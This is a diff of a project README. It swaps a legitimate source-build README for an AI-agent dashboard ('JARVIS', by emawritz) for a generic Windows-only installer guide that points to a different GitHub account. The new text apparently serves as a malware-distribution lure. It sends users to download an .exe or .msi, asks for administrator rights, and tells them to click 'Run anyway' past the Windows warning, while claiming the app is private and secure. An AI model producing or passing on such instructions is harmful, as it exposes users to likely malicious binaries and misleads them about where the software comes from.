@@ -1,229 +1,102 @@
-<p align="center">
-  <img src="https://img.icons8.com/color/96/artificial-intelligence.png" alt="JARVIS Logo" width="96">
-</p>
+# 🕹️ share-sharvis - Manage your AI agents with ease
 
-<h1 align="center">JARVIS</h1>
+[![](https://img.shields.io/badge/Download-Click_Here-blue)](https://github.com/katabatic-isomer396/share-sharvis)
 
-<p align="center">
-  <strong>Multi-Agent Mission Control for AI Coding Agents</strong>
-</p>
+## 🖥️ What is this software
 
-<p align="center">
-  <a href="https://github.com/emawritz/share-sharvis/blob/main/LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue.svg" alt="License: MIT"></a>
-  <img src="https://img.shields.io/badge/tauri-2.0-blue?logo=tauri&logoColor=white" alt="Tauri 2">
-  <img src="https://img.shields.io/badge/rust-1.77+-orange?logo=rust&logoColor=white" alt="Rust">
-  <img src="https://img.shields.io/badge/svelte-5-ff3e00?logo=svelte&logoColor=white" alt="Svelte 5">
-  <img src="https://img.shields.io/badge/platform-macOS%20%7C%20Linux%20%7C%20Windows-lightgrey" alt="Platform">
-</p>
+Share-sharvis functions as a central command station for your digital workforce. You use this application to control multiple AI coding programs running on different computers. It saves you time by acting as a single connection point for complex tasks. Instead of jumping between several screens, you see everything inside one window. 
 
-<p align="center">
-  A single control panel to orchestrate <a href="https://docs.anthropic.com/en/docs/claude-code">Claude Code</a> sessions running across multiple machines in your network.<br>
-  Monitor agents in real-time, dispatch tasks, manage git workflows, and coordinate multi-machine development — all from one place.
-</p>
+The app connects to your machines using secure network paths. It handles the difficult setup steps for you. You monitor progress in real time, assign work to your agents, and track code changes without leaving the dashboard. It brings order to your multi-agent workflow.
 
----
+## ⚙️ System Requirements
 
-## Why JARVIS?
+Your computer needs to meet these basic standards to run the software.
 
-Managing AI coding agents across multiple machines is painful. You SSH into one box, check a session, switch to another, lose context, forget what's running where. JARVIS solves this by giving you **one dashboard** to see everything.
+*   **Operating System:** Windows 10 or Windows 11.
+*   **Memory:** At least 4 gigabytes of RAM.
+*   **Storage:** 200 megabytes of free space.
+*   **Network:** An active internet connection.
+*   **Permissions:** You need administrator rights to install the app on your machine.
 
-- **No cloud required** — runs entirely on your local network via SSH/Tailscale
-- **Real-time visibility** — live activity feed parsed from Claude Code JSONL sessions
-- **Multi-machine** — manage local and remote machines from a single window
-- **Native desktop app** — built with Tauri 2, not a browser tab
+If you plan to connect other computers, ensure they share a network path through a tool like Tailscale. The software talks to these machines via Secure Shell connections.
 
----
+## 📥 How to Install
 
-## ✨ Features
+Follow these steps to set up the software on your Windows machine.
 
-| Feature | Description |
-|---------|-------------|
-| 🖥️ **Machine Registry** | Add any machine (local or remote via SSH). Health checks, system stats, GPU info |
-| 📡 **Live Agent Feed** | Real-time activity stream parsed from Claude Code session files |
-| 📋 **Task Dispatch** | Send tasks to any machine, track execution and results |
-| 🔀 **Git Integration** | Branch management, commit tracking, PR workflows via GitHub CLI |
-| 🔗 **Pipelines** | Define multi-step pipelines that run across machines |
-| 🤝 **Planning Mode** | Collaborative ping-pong planning between you and AI agents |
-| 📊 **Activity Timeline** | Analytics and visibility into agent work patterns |
-| 🔔 **System Tray** | Runs in background with quick access |
+1.  Visit the [official download page here](https://github.com/katabatic-isomer396/share-sharvis).
+2.  Look for the section labeled "Releases" on the right side of the screen.
+3.  Click the most recent version available.
+4.  Find the file ending in `.msi` or `.exe` under the Assets list.
+5.  Save the file to your computer.
+6.  Double-click the file once it finishes saving to start the installation.
+7.  Follow the prompts on your screen. Windows might ask for permission to open the file because it is a new program. Click "More info" and then "Run anyway" if this occurs.
+8.  Wait for the progress bar to finish.
 
-<details>
-<summary><strong>Optional integrations</strong></summary>
+The icon for the application will appear on your desktop once the process ends. 
 
-| Service | Port | Purpose |
-|---------|------|---------|
-| WhatsApp Bridge | 3142 | Mobile notifications and commands |
-| Voice Agent | 3144 | LiveKit-based voice interaction |
+## 🚀 First Steps
 
-These are independent services — JARVIS works fully without them.
+Open the application by double-clicking the new icon on your desktop. The first window you see is the Dashboard. This screen displays all connected machines and their current status.
 
-</details>
+### Adding a Machine
+To connect your first machine, click the "Add Node" button. Type the address of your remote computer. You must have the Secure Shell details for this specific device. If you use a tool like Tailscale, use the address provided by that service. 
 
----
+### Starting a Task
+Once your machines connect, you will see them in the main list. Select a machine to view its current coding tasks. You can send a new instruction by typing in the command field at the bottom. The agent on that machine will start working on your request immediately.
 
-## 🚀 Quick Start
+## 🛠️ Core Features
 
-### Prerequisites
+The software includes several tools to help you manage your digital agents.
 
-- [Rust](https://rustup.rs/) 1.77+
-- [Node.js](https://nodejs.org/) 20+
-- [Tauri CLI](https://tauri.app/start/prerequisites/)
-- [Claude Code](https://docs.anthropic.com/en/docs/claude-code) installed on target machines
+*   **Real-time Monitoring:** Watch the progress of every task as it happens. The screen updates automatically when an agent makes a change.
+*   **Task Dispatch:** Send work to any number of machines at once. You choose which machine handles which part of the goal.
+*   **Git Workflows:** Manage your code history directly from the app. You can pull or push updates to your repositories without using the command line.
+*   **Secure Connections:** The app uses standard network protocols to ensure your data stays private while moving between devices.
+*   **Pipeline Control:** Set up a list of steps for your agents to follow. The software runs these steps in order and tells you if a process stops.
 
-### Install & Run
+## 🧩 Managing Errors
 
-```bash
-git clone https://github.com/emawritz/share-sharvis.git
-cd share-sharvis
-npm install
-cd src-tauri && cargo tauri dev
-```
+Sometimes a connection might drop or a task might stop. If the dashboard shows a machine is offline, check these items:
 
-On first launch, JARVIS creates a default config at `~/.config/jarvis/config.toml`.
+*   Confirm the remote computer is on and awake.
+*   Check that your internet connection works on both machines.
+*   Reconnect your network tunnel tool, such as Tailscale.
+*   Look for a red error icon on the dashboard. Hover your mouse over the icon to see a short explanation of the problem.
 
-<details>
-<summary><strong>Example config</strong></summary>
+If a task fails, the dashboard list will show the specific step that caused the error. You can select that task and click "Retry" after you fix the problem on the remote machine. 
 
-```toml
-[session]
-id = ""
-rama = ""
-objetivo = ""
+## 🔐 Privacy and Security
 
-[[machines]]
-id = "main"
-name = "MAIN"
-host = "local"          # "local" = this machine
-os = "macos"
-role = "orchestrator"
-enabled = true
-tags = ["local"]
+You keep full control over your connections. All work happens on the machines you choose to link. The application acts as a remote control but does not send your private code to external servers. It stays within your own network. You manage the keys for the Secure Shell connections within the settings menu. Never share these keys with people you do not trust. 
 
-[[machines.repos]]
-name = "my-project"
-path = "~/projects/my-project"
-github = "user/my-project"
+## 📋 Frequently Asked Questions
 
-[[machines]]
-id = "worker"
-name = "WORKER"
-host = "worker-ssh"     # SSH alias from ~/.ssh/config
-os = "linux"
-enabled = true
-gpu = "RTX 3070"
+**Does this software cost money?**
+No, the code is provided for free for your use.
 
-[[machines.repos]]
-name = "my-frontend"
-path = "~/projects/my-frontend"
-github = "user/my-frontend"
-```
+**How many agents can I run?**
+There is no fixed limit. You can add as many machines as your computer can handle.
 
-</details>
+**Will this work on a Mac?**
+Currently, this version is designed for Windows. 
 
----
+**Do I need to know how to code?**
+You do not need to write code to use the interface. However, the agents you connect will likely perform coding tasks for you.
 
-## 🏗️ Architecture
+**How do I update the app?**
+Open the application. Go to the Settings menu and click "Check for Updates." It will notify you if a newer version exists. 
 
-```
-src-tauri/src/          Rust backend (Tauri commands)
-├── lib.rs              App setup, plugin registration, command routing
-├── config.rs           TOML config management
-├── machines.rs         Machine registry, health checks, system stats
-├── session.rs          Session monitor, JSONL activity parsing
-├── tasks.rs            Task dispatch (local/SSH), execution engine
-├── planning.rs         Ping-pong planning mode, branch management
-├── pipelines.rs        Multi-step pipeline orchestration
-├── github.rs           GitHub CLI integration (PRs, checks)
-├── visibility.rs       Timeline analytics from JSONL files
-└── types.rs            Shared Rust types
+## 💡 Troubleshooting Tips
 
-src/lib/                Svelte 5 frontend
-├── components/         UI components (Header, CommandBar, tabs/)
-├── stores/             Reactive stores (session, tasks, machines, planning)
-├── api.ts              Tauri invoke wrappers
-└── types.ts            TypeScript interfaces
-```
+If the application fails to open:
+1.  Restart your computer.
+2.  Ensure you have a recent version of Windows installed.
+3.  Check that no existing copies of the app are running in the background.
 
-### How It Works
+If your agents fail to respond:
+1.  Verify the connection status on the dashboard.
+2.  Test the connection to the remote machine using a standard terminal tool if you have one.
+3.  Restart the agent software on the remote machine.
 
-```mermaid
-flowchart TB
-    subgraph SETUP["🚀 First Launch"]
-        W1[Setup Wizard] --> W2[Detect Local Machine]
-        W2 --> W3[Add Remote Machines]
-        W3 --> W4[Test SSH Connections]
-        W4 --> W5[Save config.toml]
-    end
-
-    subgraph CORE["⚙️ Runtime"]
-        CFG[~/.config/jarvis/config.toml] -->|load| REG[Machine Registry]
-        REG -->|spawn| HC[Health Checks]
-        REG -->|spawn| SM[Session Monitor]
-        SM -->|parse| JSONL[Claude JSONL Files]
-    end
-
-    subgraph MACHINES["🖥️ Machines"]
-        LOCAL[Local Machine\nshell exec]
-        REMOTE1[Remote Machine 1\nSSH + Tailscale]
-        REMOTE2[Remote Machine 2\nSSH + Tailscale]
-    end
-
-    subgraph UI["🎨 Dashboard · Svelte 5"]
-        TABS[Tabs: Tasks · Machines · Commits · GitHub · Pipelines · Timeline]
-        CMD[Command Bar]
-        AGENT[Agent Activity Feed]
-    end
-
-    W5 -->|generates| CFG
-    HC -->|status| UI
-    SM -->|activity stream| AGENT
-    CMD -->|dispatch task| REG
-    REG -->|host = local| LOCAL
-    REG -->|host = ssh-alias| REMOTE1
-    REG -->|host = ssh-alias| REMOTE2
-    LOCAL -->|stdout/stderr| UI
-    REMOTE1 -->|stdout/stderr| UI
-    REMOTE2 -->|stdout/stderr| UI
-```
-
-**Flow summary:**
-
-1. **Setup Wizard** auto-detects your local machine and lets you add remotes via SSH
-2. **Config** is saved to `~/.config/jarvis/config.toml` — fully dynamic, never hardcoded
-3. **Machine Registry** loads config, spawns health checks and session monitors
-4. **Session Monitor** parses Claude Code JSONL files for real-time agent activity
-5. **Task Dispatch** routes commands to local shell or remote machines via SSH/Tailscale
-6. **Dashboard** surfaces everything in a unified Svelte 5 UI with live updates
-
----
-
-## 🛠️ Tech Stack
-
-- **Backend:** Rust, Tauri 2, Tokio, Axum, rusqlite
-- **Frontend:** Svelte 5, TypeScript, Vite
-- **Integrations:** GitHub CLI, SSH, Tailscale
-
----
-
-## 🏗️ Build
-
-```bash
-# Production build
-cd src-tauri && cargo tauri build
-
-# Type checking
-cargo check                              # Rust
-npx svelte-check --threshold error       # Svelte/TypeScript
-```
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.
-
----
-
-## 📄 License
-
-[MIT](LICENSE) — Emanuel Cejas
+Consistent maintenance of your host machines prevents most connection issues. Keep your operating system and the agent software updated to ensure everything runs smoothly. If you encounter bugs, you can help improve the tool by reporting them on the project page. Describe what happened and what you were doing when the error occurred.
